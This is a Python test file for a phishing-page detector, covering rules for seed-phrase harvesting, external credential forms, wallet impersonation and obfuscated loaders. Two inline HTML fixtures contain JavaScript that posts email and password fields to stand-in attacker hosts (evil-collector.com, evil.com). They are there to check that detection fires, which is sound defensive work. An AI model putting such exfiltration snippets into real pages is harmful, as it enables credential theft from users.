"""Tests for individual rule modules."""

from src.ml.features import parse_html
from src.rules.external_form import ExternalFormRule
from src.rules.obfuscated_loader import ObfuscatedLoaderRule
from src.rules.seed_phrase import SeedPhraseRule
from src.rules.wallet_impersonation import WalletImpersonationRule

from tests.fixtures import (
    CLEAN_HTML,
    EXTERNAL_FORM_PHISHING,
    MINIMAL_HTML,
    OBFUSCATED_LOADER_PHISHING,
    SEED_PHRASE_PHISHING,
    WALLET_IMPERSONATION_PHISHING,
)


class TestSeedPhraseRule:
    def setup_method(self):
        self.rule = SeedPhraseRule()

    def test_triggers_on_seed_phrase_page(self):
        soup = parse_html(SEED_PHRASE_PHISHING)
        result = self.rule.evaluate(SEED_PHRASE_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "seed-phrase-harvesting"
        assert result.signals["input_count"] >= 8

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_few_inputs_does_not_trigger(self):
        html = """<html><body>
        <p>Enter your recovery phrase</p>
        <input type="text"><input type="text"><input type="text">
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # only 3 inputs, need 8


class TestExternalFormRule:
    def setup_method(self):
        self.rule = ExternalFormRule()

    def test_triggers_on_external_form(self):
        soup = parse_html(EXTERNAL_FORM_PHISHING)
        result = self.rule.evaluate(EXTERNAL_FORM_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "external-credential-form"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_internal_action_does_not_trigger(self):
        html = """<html><body>
        <form action="/login" method="POST">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # relative URL, not external

    def test_js_ajax_exfil_triggers(self):
        """Password + $.ajax to external URL = credential exfiltration."""
        html = """<html><body>
        <form action="#">
            <input type="text" name="email">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        <script>
        $.ajax({
            url: "https://evil-collector.com/steal",
            method: "POST",
            data: {email: $("#email").val(), pw: $("#pw").val()}
        });
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True
        assert len(result.signals["js_exfil_patterns"]) > 0

    def test_js_fetch_exfil_triggers(self):
        """Password + fetch() to external URL = credential exfiltration."""
        html = """<html><body>
        <input type="password" name="pw">
        <script>
        fetch("https://evil.com/collect", {method: "POST", body: data});
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True

    def test_password_with_no_exfil_does_not_trigger(self):
        """Password field alone without external communication is not enough."""
        html = """<html><body>
        <form action="#">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        <script>console.log("hello");</script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False


class TestWalletImpersonationRule:
    def setup_method(self):
        self.rule = WalletImpersonationRule()

    def test_triggers_on_wallet_impersonation(self):
        soup = parse_html(WALLET_IMPERSONATION_PHISHING)
        result = self.rule.evaluate(WALLET_IMPERSONATION_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "wallet-impersonation"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_brand_without_credential_capture_does_not_trigger(self):
        html = """<html><head><title>MetaMask News</title></head>
        <body><h1>MetaMask updates</h1><p>New features released.</p></body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # no password/key phrases


class TestObfuscatedLoaderRule:
    def setup_method(self):
        self.rule = ObfuscatedLoaderRule()

    def test_triggers_on_obfuscated_loader(self):
        soup = parse_html(OBFUSCATED_LOADER_PHISHING)
        result = self.rule.evaluate(OBFUSCATED_LOADER_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "obfuscated-loader"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_normal_script_does_not_trigger(self):
        html = """<html><body>
        <script>console.log("hello world");</script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False
